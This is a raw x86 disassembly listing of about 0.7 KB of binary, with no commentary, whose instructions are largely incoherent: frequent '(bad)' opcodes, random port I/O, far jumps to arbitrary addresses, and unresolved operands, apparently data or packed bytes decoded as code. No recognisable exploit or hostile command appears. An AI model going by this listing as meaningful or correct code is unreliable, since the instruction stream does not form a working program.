  410422:	add    BYTE PTR [eax],al
  410424:	add    ah,bh
  410426:	cmp    esp,DWORD PTR [edx]
  410428:	mov    eax,0x55ef70d2
  41042d:	push   ecx
  41042e:	dec    eax
  41042f:	pop    edx
  410430:	add    ecx,ebp
  410432:	cmp    edi,DWORD PTR [ebx+0xeb2cd24]
  410438:	add    BYTE PTR [ecx+0x71],dh
  41043b:	sub    ecx,DWORD PTR [edi]
  41043d:	ins    DWORD PTR es:[edi],dx
  41043e:	cmc    
  41043f:	add    BYTE PTR [edi+esi*2+0x6c000eb5],al
  410446:	mov    edi,0xadcf097b
  41044b:	imul   ecx,DWORD PTR [edi],0x2c
  41044e:	push   ds
  41044f:	out    dx,eax
  410450:	jmp    FWORD PTR [ecx-0x7adb6cc7]
  410456:	mov    ah,0xe
  410458:	add    BYTE PTR [eax+0x6cbb85c8],dl
  41045e:	xchg   DWORD PTR ds:0xfdac9000,ecx
  410464:	mov    edi,0xb331ab3f
  410469:	mov    ah,0x89
  41046b:	or     eax,0xc7129000
  410470:	and    esi,DWORD PTR [eax+edx*2-0x266163e9]
  410477:	or     al,BYTE PTR [ebp-0x7b095cb0]
  41047d:	addr16 sahf 
  41047f:	cli    
  410480:	push   cs
  410481:	daa    
  410482:	cdq    
  410483:	test   eax,0xe37e5084
  410488:	test   BYTE PTR [eax],al
  41048a:	add    BYTE PTR [eax],al
  41048c:	add    BYTE PTR [eax],al
  41048e:	imul   eax,DWORD PTR [esi+0x663482e7],0x75
  410495:	add    edx,DWORD PTR [ecx+0x37500b99]
  41049b:	popa   
  41049c:	pop    es
  41049d:	(bad)  
  41049e:	fdiv   QWORD PTR [ebp+0x504de7fe]
  4104a4:	or     eax,0x1ab6300
  4104a9:	mov    dh,0x4a
  4104ab:	pop    esp
  4104ac:	mov    BYTE PTR [edi-0x78baaa61],bh
  4104b2:	push   esp
  4104b3:	lods   eax,DWORD PTR ds:[esi]
  4104b4:	push   ss
  4104b5:	push   ebx
  4104b6:	addr16 inc edi
  4104b8:	xor    dh,BYTE PTR [ebx+0xd69ac]
  4104be:	nop
  4104bf:	mov    al,ds:0x6d3c8a57
  4104c4:	pop    ss
  4104c5:	mov    esp,eax
  4104c7:	push   eax
  4104c8:	xchg   ecx,edx
  4104ca:	pop    esp
  4104cb:	inc    eax
  4104cc:	mov    ch,dh
  4104ce:	dec    eax
  4104cf:	dec    esp
  4104d0:	mov    ?,WORD PTR [edx]
  4104d2:	nop
  4104d3:	std    
  4104d4:	loope  0x4104d4
  4104d6:	xor    DWORD PTR [edx+0x16300e7c],0x2a
  4104dd:	add    al,0x1d
  4104df:	out    dx,eax
  4104e0:	add    DWORD PTR [eax+eax*2],ebx
  4104e3:	call   0x19dc:0xb29046f8
  4104ea:	xchg   edi,eax
  4104eb:	ds or  eax,esi
  4104ee:	xchg   ecx,eax
  4104ef:	mov    dl,0xe5
  4104f1:	cmp    al,0x0
  4104f3:	add    BYTE PTR [eax],al
  4104f5:	add    BYTE PTR [eax],al
  4104f7:	inc    ebx
  4104f8:	into   
  4104f9:	icebp  
  4104fa:	add    DWORD PTR [eax+0x433d2fb2],edx
  410500:	into   
  410501:	rol    DWORD PTR [ecx],0x90
  410504:	mov    dl,0x98
  410506:	push   esi
  410507:	sbb    al,BYTE PTR [edx-0x484c409b]
  41050d:	in     eax,0xb7
  41050f:	mov    WORD PTR [edx-0x4d6f2941],ds
  410515:	ins    BYTE PTR es:[edi],dx
  410516:	inc    ebp
  410517:	in     eax,0xe5
  410519:	sbb    al,0x83
  41051b:	push   ebx
  41051c:	mov    ds:0x749003e3,al
  410521:	cmc    
  410522:	add    eax,ebx
  410524:	(bad)  [edi+0x40dd3888]
  41052a:	push   ss
  41052b:	mov    al,ds:0xb03a5a4
  410530:	push   0xffffff8d
  410532:	sub    edx,DWORD PTR [edx+0x5b7de5b2]
  410538:	add    ebp,DWORD PTR [edx-0x589544fd]
  41053e:	out    dx,al
  41053f:	pop    ebp
  410540:	xchg   edx,edi
  410542:	xor    eax,DWORD PTR [ecx-0x6b771a0e]
  410548:	push   ss
  410549:	xchg   ebp,eax
  41054a:	(bad)  
  41054b:	fisttp WORD PTR [esi-0x4d6f67a8]
  410551:	fs out 0x3b,al
  410554:	add    ecx,DWORD PTR [edi]
  410556:	lods   eax,DWORD PTR ds:[esi]
  410557:	xchg   ebx,eax
  410558:	mov    dl,0x3b
  41055a:	sub    DWORD PTR [eax],eax
  41055c:	add    BYTE PTR [eax],al
  41055e:	add    BYTE PTR [eax],al
  410560:	in     eax,0xc
  410562:	lods   al,BYTE PTR ds:[esi]
  410563:	dec    ebp
  410564:	push   edx
  410566:	push   cs
  410567:	fiadd  WORD PTR [ecx-0x73d6e366]
  41056d:	cdq    
  41056e:	call   0x5b1f:0x57b293e9
  410575:	sahf   
  410576:	(bad)  
  410577:	fist   DWORD PTR [ebx-0x7a]
  41057a:	add    BYTE PTR [esi-0x77],bh
  41057d:	adc    bh,BYTE PTR [ebp+eiz*1-0x6c]
  410581:	mov    cl,0xf3
  410583:	pusha  
  410584:	sub    BYTE PTR [ecx],al
  410586:	dec    ebx
  410587:	jmp    0xeb278aa0
  41058c:	xchg   ebx,eax
  41058d:	mov    dl,0x78
  41058f:	sub    dh,bl
  410591:	jne    0x41059a
  410593:	jmp    0x63fea02b
  410598:	xchg   ebp,eax
  410599:	mov    dl,0x8a
  41059b:	test   eax,0x35ffe600
  4105a0:	xchg   ecx,eax
  4105a1:	push   cs
  4105a2:	jl     0x410551
  4105a4:	xchg   ebx,eax
  4105a5:	inc    ebp
  4105a6:	out    0xea,al
  4105a8:	xchg   ebx,eax
  4105a9:	mov    dl,0x83
  4105ab:	es aaa 
  4105ad:	jns    0x4105d2
  4105af:	sub    BYTE PTR [ecx],cl
  4105b1:	mov    ds:0x16897205,al
  4105b6:	jl     0x41055d
  4105b8:	xchg   ebx,eax
  4105b9:	loopne 0x41053c
  4105bb:	in     eax,dx
  4105bc:	int3   
  4105bd:	cmc    
  4105be:	pop    ebp
  4105bf:	inc    ecx
  4105c0:	cmp    DWORD PTR [ecx],ebp
  4105c2:	or     eax,0xe9
  4105c7:	add    BYTE PTR [eax],al
  4105c9:	or     BYTE PTR [edx+0x1974b913],dh
  4105cf:	jl     0x41057e
  4105d1:	xchg   ebx,eax
  4105d2:	mov    cl,0xcc
  4105d4:	add    bh,BYTE PTR [ebx+0x37]
  4105d7:	sbb    al,BYTE PTR [eax]
  4105d9:	into   
  4105da:	fnstcw WORD PTR [ebp-0x66]
  4105dd:	mov    eax,0x45c08ab1
  4105e2:	mov    es,WORD PTR [eax]
  4105e4:	mov    bh,0xdc
  4105e6:	and    eax,0x3aa9447c
  4105eb:	or     ebx,DWORD PTR [ebx]
  4105ed:	imul   ecx,DWORD PTR [edi],0xae757364
  4105f3:	add    DWORD PTR [ecx+esi*2],0x63e83f63
  4105fa:	and    eax,0x37d7000e
  4105ff:	xor    ah,BYTE PTR [edx+ecx*8+0x72]
  410603:	out    dx,eax
  410604:	push   ebp
  410605:	mov    cs:0xaea912e6,al
  41060b:	dec    edi
  41060c:	pop    esi
  41060d:	lods   al,BYTE PTR ds:[esi]
  41060e:	gs int3 
  410610:	push   esi
  410611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410612:	or     DWORD PTR [ebx+esi*2-0x4b],eax
  410616:	scas   al,BYTE PTR es:[edi]
  410617:	push   edi
  410618:	mov    ebx,ebx
  41061a:	enter  0xf01a,0x6b
  41061e:	jno    0x41060f
  410620:	mov    ch,BYTE PTR [ecx+eax*2]
  410623:	jl     0x410669
  410625:	sub    DWORD PTR [edi+0x1b],edx
  410628:	pop    eax
  410629:	inc    edi
  41062a:	or     al,0x68
  41062c:	jae    0x41062e
  41062e:	add    BYTE PTR [eax],al
  410630:	add    BYTE PTR [eax],al
  410632:	cmc    
  410633:	mov    al,0xe6
  410635:	fsub   DWORD PTR [ebx-0x387af152]
  41063b:	inc    edx
  41063c:	pop    es
  41063d:	and    DWORD PTR [ecx+eax*2],edx
  410640:	jl     0x410686
  410642:	stc    
  410643:	rcr    DWORD PTR ds:0xf056f96a,cl
  410649:	mov    esp,DWORD PTR [edi+0x5ee8c67c]
  41064f:	lods   al,BYTE PTR ds:[esi]
  410650:	push   cs
  410651:	add    BYTE PTR [edx+0x41],bl
  410654:	jl     0x41069a
  410656:	nop
  410657:	fdiv   st(6),st
  41065a:	test   DWORD PTR [ebx+0x4c904019],esi
  410660:	aad    0xc2
  410662:	arpl   WORD PTR [esi],bx
  410664:	fst    QWORD PTR [esi+0x1b]
  410667:	mov    ds:0x26fdf5f8,al
  41066c:	mov    eax,0x81c69043
  410671:	std    
  410672:	sbb    DWORD PTR [eax-0x775febcb],ebp
  410678:	retf   
  410679:	push   DWORD PTR ds:0x4c72ae3a
  41067f:	fwait
  410680:	lods   eax,DWORD PTR ds:[esi]
  410681:	test   BYTE PTR [eax-0x42],dl
  410684:	fisttp WORD PTR [edx+0x43b9ed95]
  41068a:	nop
  41068b:	push   cs
  41068c:	inc    esp
  41068d:	jae    0x41063a
  41068f:	jl     0x41070f
  410691:	iret   
  410692:	js     0x410704
  410694:	jne    0x410694
  410696:	add    BYTE PTR [eax],al
  410698:	add    BYTE PTR [eax],al
  41069a:	add    BYTE PTR [edi+0x17],ah
  41069d:	dec    ebx
  41069e:	jae    0x41071f
  4106a0:	fs jle 0x4106df
  4106a3:	in     al,dx
  4106a4:	mov    BYTE PTR [edi+0x709918ff],ch
  4106aa:	(bad)  
  4106ab:	mov    esp,0xd91fa167
  4106b0:	stos   DWORD PTR es:[edi],eax
  4106b1:	repz or eax,eax
  4106b4:	push   0x961965ef
  4106b9:	mov    ebx,0xb8e46b45
  4106be:	(bad)
  4106c2:	out    0x82,eax
  4106c4:	pop    ecx
  4106c5:	or     ecx,DWORD PTR [ebx+0x5cd524d7]
  4106cb:	imul   ebx,eax,0xffffffbf
  4106ce:	mov    ch,ah
  4106d0:	sbb    BYTE PTR [edi],ch
  4106d2:	not    DWORD PTR [ecx]
  4106d4:	mov    bl,0x19
  4106d6:	mov    al,0x92
  4106d8:	mov    dl,0xe5
  4106da:	aam    0x3d
  4106dc:	aaa    
  4106dd:	xchg   edx,eax
  4106de:	or     eax,DWORD PTR [edi+0x2d]
  4106e1:	pop    ss
  4106e2:	or     DWORD PTR [ecx+esi*8],ecx
  4106e5:	out    0x3,al
  4106e7:	nop
  4106e8:	call   0x4461:0xb29031ca
  4106ef:	mov    gs,WORD PTR [esi]
  4106f1:	mov    edx,0x66b29002
  4106f6:	mov    ecx,0x3e3b193
  4106fb:	nop
  4106fc:	mov    bl,0x62
  4106fe:	jno    0x410700
  410700:	add    BYTE PTR [eax],al
  410702:	add    BYTE PTR [eax],al
  410704:	lahf   
  410705:	and    ebp,0x7c
  410708:	dec    ebx
  410709:	jmp    DWORD PTR [ecx]
  41070b:	add    al,0xe3
  41070d:	sbb    edx,0x33
  410710:	mov    eax,ds:0x30a1e5f2
  410715:	sbb    dh,BYTE PTR ds:0x630d77c0
  41071b:	inc    ebx
  41071c:	sahf   
  41071d:	cs jae 0x410723
  410720:	nop
  410721:	mov    dl,0x5e
  410723:	cmp    BYTE PTR [esi-0x4e],bl
  410726:	in     eax,0xa1
  410728:	xchg   edx,eax
  410729:	jno    0x4107a5
  41072b:	iret   
  41072c:	jae    0x4106fc
  41072e:	dec    esi
  41072f:	dec    edx
  410730:	inc    edi
  410731:	and    ebp,0xffffffa1
  410734:	repnz sbb ebp,esi
  410737:	mov    edi,0x3e668b37
  41073c:	nop
  41073d:	mov    dl,0xb6
  41073f:	xchg   bl,bl
  410741:	into   
  410742:	or     eax,0xe6fb532c
  410747:	add    ecx,DWORD PTR [ebx]
  410749:	mov    ah,BYTE PTR [edx+0x38]
  41074c:	or     DWORD PTR [ebx+eiz*2],0xffffffcf
  410750:	mov    bl,0xc6
  410752:	push   cs
  410753:	jo     0x4107a5
  410755:	sub    edi,0xffffffe9
  410758:	stos   DWORD PTR es:[edi],eax
  410759:	adc    dl,cl
  41075b:	call   0xc59b3cf3
  410760:	or     DWORD PTR [ecx-0x3a],0xffffffe9
  410764:	xchg   ebx,eax
  410765:	mov    dl,0xe6
  410767:	mov    ah,0x0
  410769:	add    BYTE PTR [eax],al
  41076b:	add    BYTE PTR [eax],al
  41076d:	xchg   esi,eax
  41076e:	mov    dl,0xe
  410770:	push   es
  410771:	sahf   
  410772:	mov    ds,WORD PTR [ecx+ebp*4]
  410775:	xchg   ebx,eax
  410776:	loop   0x410725
  410778:	jns    0x41077e
  41077a:	out    dx,eax
  41077b:	push   cs
  41077c:	out    dx,al
  41077d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41077e:	inc    edx
  41077f:	jle    0x4107ae
  410781:	xchg   esp,eax
  410782:	sub    eax,0xced86cce
  410787:	push   ss
  410788:	out    0xd0,al
  41078a:	push   0x5d
  41078c:	pop    esp
  41078d:	ror    dh,1
  41078f:	inc    esi
  410790:	sbb    DWORD PTR [ecx],ebx
  410792:	sub    dh,BYTE PTR ss:[ecx-0x73]
  410796:	mov    dl,0xe
  410798:	inc    ecx
  410799:	nop
  41079a:	mov    bl,0xe
  41079c:	jmp    0xaeaaa204
  4107a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107a2:	or     BYTE PTR [ebx-0x75d07b5b],0xcd
  4107a9:	sbb    esi,DWORD PTR [ebx-0xdb916f2]
  4107af:	out    0xd7,al
  4107b1:	ds mov ah,0xe
  4107b4:	jb     0x4107fd
  4107b6:	jmp    0xe5cd21aa
  4107bb:	out    dx,eax
  4107bc:	aam    0x6b
  4107be:	mov    ds:0x37ae94e,eax
  4107c3:	mov    ds,edi
  4107c5:	daa    
  4107c6:	or     BYTE PTR [esi],0xe9
  4107c9:	xchg   ebx,eax
  4107ca:	pop    es
  4107cb:	pushw  0xffde
  4107ce:	mov    ecx,0x13
  4107d3:	add    BYTE PTR [eax],al
  4107d5:	add    BYTE PTR [ebp+0x55],cl
  4107d8:	add    BYTE PTR [ebp+ecx*4+0x3e],0x3f
  4107dd:	(bad)  
  4107de:	fcomp  QWORD PTR [ecx+0x1a]
  4107e1:	inc    eax
  4107e2:	jmp    0x2db5b719
  4107e7:	dec    esp
  4107e8:	out    dx,eax
  4107e9:	imul   esp,eax,0xe1244b2a
  4107ef:	add    BYTE PTR gs:[ebp+ecx*8-0x46000fff],0x65
  4107f8:	add    BYTE PTR [edi-0xd64811],bh
  4107fe:	test   eax,0xa6500eb5
  410803:	dec    edi
  410804:	pop    es
  410805:	jmp    FWORD PTR [ecx+edx*2+0x32b9401a]
  41080c:	scas   eax,DWORD PTR es:[edi]
  41080d:	jle    0x4107a4
  41080f:	xor    eax,0xab3c01f7
  410814:	mov    edi,DWORD PTR [esi-0x7f]
  410817:	lods   eax,DWORD PTR ds:[esi]
  410818:	jns    0x410823
  41081a:	adc    BYTE PTR [ecx+0x40],cl
  41081d:	inc    eax
  41081e:	imul   ecx,esp,0x1f717f1a
  410824:	mov    WORD PTR [ebp+ebx*2-0x5b],?
  410828:	cs jb  0x410894
  41082b:	test   dh,al
  41082d:	data16 lock jns 0x41087c
  410831:	adc    BYTE PTR [ecx+edi*2-0x59deefd5],dh
  410838:	icebp  
  410839:	inc    DWORD PTR [eax]
  41083b:	add    BYTE PTR [eax],al
  41083d:	add    BYTE PTR [eax],al
  41083f:	(bad)  
  410840:	outs   dx,DWORD PTR ds:[esi]
  410841:	lock adc eax,0x4ea391
  410847:	xchg   BYTE PTR [eax+0x54],ch
  41084a:	mov    ebx,esp
  41084c:	pop    edx
  41084d:	int    0x4
  41084f:	cmp    DWORD PTR [edi-0x7c],ebp
  410852:	je     0x4107e4
  410854:	scas   eax,DWORD PTR es:[edi]
  410855:	add    dl,BYTE PTR [edi-0x42]
  410858:	lock push ds
  41085a:	jo     0x410801
  41085c:	dec    ebx
  41085d:	or     ecx,DWORD PTR [ebx-0xcd01cf8]
  410863:	xchg   ecx,eax
  410864:	mov    ebp,DWORD PTR [edi-0x41]
  410867:	xchg   DWORD PTR [edi],edx
  410869:	xchg   edi,edi
  41086b:	out    dx,eax
  41086c:	mov    cl,BYTE PTR [esi-0x70e86802]
  410872:	(bad)  
  410873:	fisttp WORD PTR [edx+0x2791fd8c]
  410879:	add    eax,0x9f85ce83
  41087e:	add    al,0x13
  410880:	xor    ecx,0xc01c4674
  410886:	(bad)  
  410887:	popf   
  410888:	stos   DWORD PTR es:[edi],eax
  410889:	sbb    eax,0x53049040
  41088e:	test   bl,cl
  410890:	out    0x91,al
  410892:	dec    ebp
  410893:	and    al,0x82
  410895:	mov    gs,ebp
  410897:	mov    fs,edi
  410899:	or     DWORD PTR [ebx+0x3a0907e],eax
  41089f:	sbb    edi,DWORD PTR ds:0x1925
  4108a5:	add    BYTE PTR [eax],al
  4108a7:	add    BYTE PTR [ebx],cl
  4108a9:	mov    esi,0x666b0fee
  4108ae:	dec    al
  4108b0:	shl    DWORD PTR [esp+ecx*1],1
  4108b3:	xor    ebx,DWORD PTR [ecx-0x5c]
  4108b6:	or     ch,BYTE PTR [edx+0x5f]
  4108b9:	adc    eax,0x8aece75e
  4108be:	or     eax,DWORD PTR [eax]
  4108c0:	sbb    edi,edx
  4108c2:	outs   dx,DWORD PTR ds:[esi]
  4108c3:	cmc    
  4108c4:	mov    esp,0xccbcc03a
  4108c9:	jl     0x41087a
  4108cb:	(bad)  
  4108cc:	fcom   QWORD PTR [eax]
  4108ce:	add    al,dh
  4108d0:	xor    BYTE PTR [edx+0x32e903a5],0xa0
  4108d7:	ret    
  4108d8:	pop    ds
  4108d9:	cwde   
  4108da:	(bad)  [edi]
  4108dc:	push   ss
  4108dd:	sub    BYTE PTR [esi+eax*2-0x9],0x3
  4108e2:	dec    edx
  4108e3:	xor    eax,0xf30e606
  4108e8:	call   0x5544ae91
  4108ed:	mov    ebx,0x2b96b034
  4108f2:	aaa    
  4108f3:	sub    al,0xa4
  4108f5:	sbb    ah,dh
  4108f7:	add    eax,DWORD PTR [edi+0x7f]
  4108fa:	repnz daa 
  4108fc:	xor    edx,0x781ad8e5
  410902:	test   al,0xd5
  410904:	shl    DWORD PTR [esi-0x29ac771b],1
  41090a:	loope  0x4108dc
  41090c:	add    BYTE PTR [eax],al
  41090e:	add    BYTE PTR [eax],al
  410910:	add    BYTE PTR [ebx+ebp*1+0x1b],bl
  410914:	mov    DWORD PTR [eax-0x69455acb],edi
  41091a:	sub    edi,DWORD PTR [ebx+ebp*1+0x3e3f5b0]
  410921:	or     eax,0xc3005e73
  410926:	jb     0x410904
  410928:	cli    
  410929:	fisubr WORD PTR [ebx]
  41092b:	xor    eax,esp
  41092d:	mov    ds:0xe0d2aec3,eax
  410932:	jg     0x41096d
  410934:	loopne 0x4108c5
  410936:	out    0x35,eax
  410938:	rol    eax,1
  41093a:	in     eax,0x90
  41093c:	push   cs
  41093d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41093f:	and    eax,0xff720d04
  410944:	(bad)  
  410946:	inc    cl
  410948:	sbb    edx,DWORD PTR [eax-0x447c2500]
  41094e:	mov    edx,0x693760e
  410953:	add    DWORD PTR [edx-0x1ae92d11],esi
  410959:	daa    
  41095a:	(bad)  
  41095b:	into   
  41095c:	push   edx
  41095d:	pop    ds
  41095e:	jne    0x41096a
  410960:	adc    DWORD PTR [edi+ebx*8-0x54ae4daf],ecx
  410967:	push   cs
  410968:	cwde   
  410969:	(bad)  
  41096a:	out    0x64,eax
  41096c:	jmp    0xbe31889a
  410971:	xlat   BYTE PTR ds:[ebx]
  410972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410973:	sub    DWORD PTR [eax],0x0
  410976:	add    BYTE PTR [eax],al
  410978:	add    BYTE PTR [eax],al
  41097a:	sbb    BYTE PTR [ecx-0x5d38527b],cl
  410980:	out    0x6c,al
  410982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410983:	sub    bh,0x62
  410986:	fwait
  410987:	ss out dx,eax
  410989:	mov    cs,edi
  41098b:	ret    
  41098c:	into   
  41098d:	adc    dl,dl
  41098f:	neg    DWORD PTR [eax+0x72]
  410992:	push   esp
  410993:	xchg   edi,eax
  410994:	popf   
  410995:	pop    esi
  410996:	xchg   edx,eax
  410997:	mov    dl,0x83
  410999:	stc    
  41099a:	sub    eax,0x27187a85
  41099f:	jmp    0x4109cb
  4109a1:	in     eax,dx
  4109a2:	(bad)  
  4109a3:	out    0x58,eax
  4109a5:	(bad)  
  4109a6:	fcom   st(2)
  4109a8:	cs (bad) 
  4109aa:	jmp    0xa50758dd
  4109af:	fsub   st(7),st
  4109b1:	mov    esi,0x3dcbb8c3
  4109b6:	ja     0x4109e1
  4109b8:	rol    cl,0x16
  4109bb:	and    eax,0x3e5ee90d
  4109c0:	jecxz  0x4109af
  4109c2:	fdivrp st(1),st
  4109c4:	sub    dh,ch
  4109c6:	or     BYTE PTR [esi],bh
  4109c8:	jp     0x4109b5
  4109ca:	int3   
  4109cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109cc:	add    DWORD PTR [eax],0xfffffff7
  4109cf:	ins    DWORD PTR es:[edi],dx
  4109d0:	push   ecx
  4109d1:	pop    edi
  4109d2:	pushf  
  4109d3:	outs   dx,DWORD PTR ds:[esi]
  4109d4:	int    0x8
  4109d6:	sub    ebp,edi
  4109d8:	dec    ebx
  4109d9:	and    al,0x35
  4109db:	gs pop edx
  4109dd:	mov    eax,DWORD PTR [eax]
  4109df:	add    BYTE PTR [eax],al
  4109e1:	add    BYTE PTR [eax],al
  4109e3:	sar    ebp,cl
  4109e5:	out    0x85,al
  4109e7:	imul   ecx,DWORD PTR [edi+0x0],0x4e9e728b
  4109ee:	inc    ebp
  4109ef:	sti    
  4109f0:	mov    cl,0x89
  4109f2:	rcl    al,0xb5
  4109f5:	cmp    eax,eax
  4109f7:	bound  ecx,QWORD PTR [esi-0x69ca00a8]
  4109fd:	pop    ss
  4109fe:	mov    edi,DWORD PTR ds:0x29571796
  410a04:	gs cmp al,0xdb
  410a07:	sbb    bl,BYTE PTR [ebx-0x10]
  410a0a:	adc    eax,0x4ea481
  410a0f:	xor    al,0xf6
  410a11:	jno    0x410a26
  410a13:	shr    BYTE PTR [ebp+0x2b],1
  410a16:	sbb    BYTE PTR [edi],bh
  410a18:	cwde   
  410a19:	push   0xf1691d39
  410a1e:	je     0x4109e9
  410a20:	mov    WORD PTR [ebx+0x24],cs
  410a23:	xchg   ecx,eax
  410a24:	inc    edx
  410a25:	or     esi,DWORD PTR [ebx]
  410a27:	jmp    0xf07413c8
  410a2c:	dec    ebx
  410a2d:	xchg   BYTE PTR [esi+esi*4],cl
  410a30:	popa   
  410a31:	push   edx
  410a32:	pop    ebx
  410a33:	cmp    edi,DWORD PTR [ebp-0x11]
  410a36:	push   eax
  410a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a38:	pop    ecx
  410a39:	gs add bl,dl
  410a3c:	mov    dh,0xef
  410a3e:	je     0x4109d5
  410a40:	scas   al,BYTE PTR es:[edi]
  410a41:	add    ecx,0xffffffe2
  410a44:	lahf   
  410a45:	xchg   BYTE PTR [eax+eax*1+0x0],al
  410a49:	add    BYTE PTR [eax],al
  410a4b:	add    BYTE PTR [ebp-0x5b],dl
  410a4e:	out    0x8e,al
  410a50:	nop
  410a51:	and    al,0x3c
  410a53:	(bad)  
  410a54:	sbb    esp,DWORD PTR [ebx]
  410a56:	xchg   dh,bh
  410a58:	(bad)  
  410a59:	(bad)  
  410a5a:	clc    
  410a5b:	mov    edi,0x55c3c92b
  410a60:	add    eax,0x5de7fc97
  410a65:	in     eax,0xa
  410a67:	add    BYTE PTR [ebx],bl
  410a69:	fild   DWORD PTR [esi+0x6f9aa4f5]
  410a6f:	dec    ebx
  410a70:	ins    BYTE PTR es:[edi],dx
  410a71:	xchg   edi,eax
  410a72:	fcom   DWORD PTR [esi+0x66]
  410a75:	in     al,dx
  410a76:	mov    bh,0x23
  410a78:	mov    al,0x0
  410a7a:	push   edi
  410a7b:	mov    WORD PTR [edi-0x44],ds
  410a7e:	adc    ebx,DWORD PTR [esi-0x9]
  410a81:	ret    
  410a82:	cmp    al,0x3a
  410a84:	rol    DWORD PTR [esi-0x10],cl
  410a87:	mov    dl,dh
  410a89:	mov    ds:0x8b91957d,al
  410a8e:	clc    
  410a8f:	mov    edi,0x437096eb
  410a94:	je     0x410a25
  410a96:	xchg   BYTE PTR [edi+0x1772893c],bh
  410a9c:	or     edx,ebp
  410a9e:	rcr    BYTE PTR [ebp+0x57],0x26
  410aa2:	ret    0x98c1
  410aa5:	mov    edx,esi
  410aa7:	mov    dh,BYTE PTR [edi+eax*1-0x3bb9dcd1]
  410aae:	jge    0x410b2f
  410ab0:	add    BYTE PTR [eax],al
  410ab2:	add    BYTE PTR [eax],al
  410ab4:	add    BYTE PTR [ebx],ah
  410ab6:	iret   
  410ab7:	or     bh,BYTE PTR [esi+0xb8aac]
  410abd:	fild   WORD PTR [edx]
  410abf:	clc    
  410ac0:	jg     0x410ac5
  410ac2:	(bad)  
  410ac3:	or     bh,bh
  410ac5:	popf   
  410ac6:	mov    DWORD PTR [edx],ebx
  410ac8:	inc    eax
  410ac9:	nop
  410aca:	push   ss
  410acb:	dec    ebx
  410acc:	push   cs
  410acd:	or     al,0xb3
  410acf:	or     DWORD PTR [ebx],eax
  410ad1:	nop
  410ad2:	mov    dl,0x64
  410ad4:	out    dx,eax
  410ad5:	pop    es
  410ad6:	add    BYTE PTR [edx],ah
  410ad8:	add    al,0x92
  410ada:	stos   DWORD PTR es:[edi],eax
  410adb:	push   0x1
  410add:	xchg   ecx,eax
  410ade:	mov    dl,0xe5
  410ae0:	arpl   WORD PTR [ecx],bx
  410ae2:	pop    es
  410ae3:	sub    al,BYTE PTR [esp+esi*2]
  410ae6:	mov    cl,0xf2
  410ae8:	fdiv   st,st(0)
  410aea:	ss hlt 
  410aec:	(bad)  
  410aed:	daa    
  410aee:	xor    DWORD PTR [ebp+0x7],ebp
  410af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410af2:	retf   0x7c86
  410af5:	mov    ds:0x4f86e5f6,al
  410afa:	push   es
  410afb:	ror    BYTE PTR [ecx-0x74],cl
  410afe:	cli    
  410aff:	mov    ah,0xc7
  410b01:	push   DWORD PTR [edx+0x7bf77b5e]
  410b07:	in     eax,0x84
  410b09:	out    0xb1,eax
  410b0b:	mov    ecx,0xe37b1306
  410b10:	mov    dh,0x5e
  410b12:	je     0x410afe
  410b14:	stos   DWORD PTR es:[edi],eax
  410b15:	(bad)  
  410b16:	mul    ch
  410b18:	add    eax,0x0
  410b1d:	add    BYTE PTR [ebx-0x72d39afc],bh
  410b23:	add    eax,0x176277
  410b28:	stos   BYTE PTR es:[edi],al
  410b29:	add    ecx,DWORD PTR ds:0xd5fa7273
  410b2f:	mov    ch,0x7d
  410b31:	mov    ah,0x53
  410b33:	mov    dl,0xe1
  410b35:	sbb    al,0x3e
  410b37:	das    
  410b38:	in     eax,dx
  410b39:	add    bl,BYTE PTR ds:0x8069fd8
  410b3f:	add    BYTE PTR [edx],ch
  410b41:	add    al,0x8e
  410b43:	xchg   DWORD PTR [esi],edx
  410b45:	lock xchg ecx,eax
  410b47:	push   es
  410b48:	jmp    0xf320:0xf0592ef
  410b4f:	das    
  410b50:	jnp    0x410b77
  410b52:	mov    WORD PTR [edi],gs
  410b54:	imul   ah
  410b56:	mov    eax,es:0xdbdc8b
  410b5c:	dec    ebx
  410b5d:	jmp    0xa77a10f7
  410b62:	mov    ?,edx
  410b64:	jnp    0x410b93
  410b66:	xchg   esp,eax
  410b67:	scas   eax,DWORD PTR es:[edi]
  410b68:	jecxz  0x410b36
  410b6a:	or     al,0x83
  410b6c:	or     ah,bh
  410b6e:	dec    ebx
  410b6f:	sub    BYTE PTR [ecx],al
  410b71:	popa   
  410b72:	fsub   st(6),st
  410b74:	push   cs
  410b75:	ins    BYTE PTR es:[edi],dx
  410b76:	pop    edx
  410b77:	push   es
  410b78:	push   es
  410b79:	daa    
  410b7a:	mov    ?,edx
  410b7c:	jnp    0x410b2b
  410b7e:	xchg   ebx,eax
  410b7f:	mov    ch,0xe3
  410b81:	hlt    
  410b82:	add    BYTE PTR [eax],al
  410b84:	add    BYTE PTR [eax],al
  410b86:	add    BYTE PTR [eax+0x44c10944],dl
  410b8c:	out    dx,eax
  410b8d:	push   cs
  410b8e:	ror    DWORD PTR [eax-0x6dcf7428],cl
  410b94:	stos   DWORD PTR es:[edi],eax
  410b95:	dec    edx
  410b96:	sub    ebp,DWORD PTR [ebp+0x3]
  410b99:	jl     0x410b48
  410b9b:	xchg   ebx,eax
  410b9c:	stos   DWORD PTR es:[edi],eax
  410b9d:	mov    bh,0xe4
  410b9f:	push   edi
  410ba0:	add    BYTE PTR [ebx-0x17],cl
  410ba3:	les    ebp,FWORD PTR [ecx-0x73]
  410ba6:	int3   
  410ba7:	inc    edi
  410ba8:	add    BYTE PTR [ebx-0x17],cl
  410bab:	cmp    BYTE PTR [esi+ecx*1-0x17],0x90
  410bb0:	repz int 0x8f
  410bb3:	xor    al,0xf9
  410bb5:	jnp    0x410b5c
  410bb7:	xchg   ebx,eax
  410bb8:	cmp    ch,bh
  410bba:	jmp    0x20a9be52
  410bbf:	mov    DWORD PTR [esi],esp
  410bc1:	jp     0x410bf0
  410bc3:	xchg   esp,eax
  410bc4:	add    DWORD PTR [edx],ebx
  410bc6:	inc    edi
  410bc7:	jne    0x410b70
  410bc9:	cwde   
  410bca:	add    BYTE PTR [ebp+0x6574ef6a],bh
  410bd0:	push   ss
  410bd1:	pushf  
